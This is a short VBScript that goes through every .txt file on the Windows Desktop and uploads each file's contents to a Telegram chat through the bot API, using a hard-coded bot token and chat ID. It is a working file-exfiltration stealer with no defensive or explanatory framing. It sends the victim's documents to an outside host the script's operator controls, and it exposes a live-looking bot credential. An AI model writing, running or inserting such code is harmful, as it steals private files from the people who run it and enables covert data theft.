' Define the Telegram bot token and chat ID
botToken = "7330914458:AAG6WF-ZRy7Lzp1HD8y5hKtCaftr5UKCWX4"
chatID = "7222681441"

' Get the Desktop path
Set objShell = CreateObject("WScript.Shell")
desktopPath = objShell.SpecialFolders("Desktop")

' Create a FileSystemObject
Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(desktopPath)

' Iterate over all .txt files on the Desktop
For Each file In folder.Files
    If LCase(fso.GetExtensionName(file.Name)) = "txt" Then
        ' Read the file content
        Set objFile = fso.OpenTextFile(file.Path, 1)
        fileContent = objFile.ReadAll
        objFile.Close
        
        ' Create a boundary for the multipart form-data
        boundary = "---------------------------" & Replace(CStr(Timer), ".", "")
        
        ' Create the POST data
        postData = "--" & boundary & vbCrLf
        postData = postData & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & chatID & vbCrLf
        postData = postData & "--" & boundary & vbCrLf
        postData = postData & "Content-Disposition: form-data; name=""document""; filename=""" & file.Name & """" & vbCrLf
        postData = postData & "Content-Type: text/plain" & vbCrLf & vbCrLf & fileContent & vbCrLf
        postData = postData & "--" & boundary & "--" & vbCrLf
        
        ' Create the HTTP request
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendDocument", False
        http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
        http.send postData
        
        ' Check the response
        If http.Status <> 200 Then
            WScript.Echo "Failed to send " & file.Name & ": " & http.Status & " " & http.StatusText
        End If
        
        ' Clean up
        Set http = Nothing
    End If
Next

' Clean up
Set fso = Nothing
Set objShell = Nothing